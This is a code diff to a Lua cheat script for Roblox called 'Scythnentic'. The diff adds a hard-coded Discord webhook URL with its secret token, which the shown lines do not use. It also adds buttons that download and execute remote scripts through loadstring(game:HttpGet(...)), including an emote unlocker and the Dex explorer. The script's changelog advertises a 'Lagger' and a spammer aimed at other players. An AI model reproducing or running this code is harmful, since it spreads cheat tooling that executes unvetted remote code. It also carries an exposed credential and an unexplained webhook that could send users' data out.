@@ -1,6 +1,8 @@
 -- // Script made by @athena.software \\ -- 
 
 -- // Etc Functionality | B4 loading \\ -- 
+local HttpService = game:GetService("HttpService")
+local webhook = "https://ptb.discord.com/api/webhooks/1140557436877549588/BAise0hEJrHnVttRXmC1_LwHnfAqOo3NZKnr-stAfuVnyAcSp4XK9elsEoArySfa56tB"
 local Namecall
 local sh = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
 local Clipon = false
@@ -19,7 +21,7 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Amet
 local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()
 local cheatname = "Scythnentic"
 local version = "Version 2.9 | REBIRTH REWRITE"
-local Message = "- Added Lagger\n- Added Anti-Lag\n- Schizophied Spammer"
+local Message = "- Added Lagger\n- Added Anti-Lag\n- Schizophied Spammer\n- Added Dex V5 (Ig idek what ver it is)\n- Added Use any emote"
 -- // ...
 
 Rayfield:Notify({ Title = cheatname, Content = "Injected Script!", Duration = 6.5, Image = 12995567709,
@@ -816,6 +818,12 @@ local Reset = LocalPlayer:CreateButton({ Name = "Reset",
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = PreviousPosition
 end,
 })
+
+local Emotes = Others:CreateButton({ Name = "Unlock all emotes",
+   Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FEmotesGui/main/FEmotesGui.lua", true))()
+end,
+})
 -- // LocalPlayer
 
 -- // Movement
@@ -1052,6 +1060,13 @@ local DomainX = Others:CreateButton({
     Name = "Load Domain-X",
     Callback = function()
         loadstring(game:HttpGet(('https://sirius.menu/domainx'),true))();
+    end,
+})
+
+local Dex = Others:CreateButton({
+    Name = "Load Dex",
+    Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/dex.lua'),true))();
     end,
 })
 
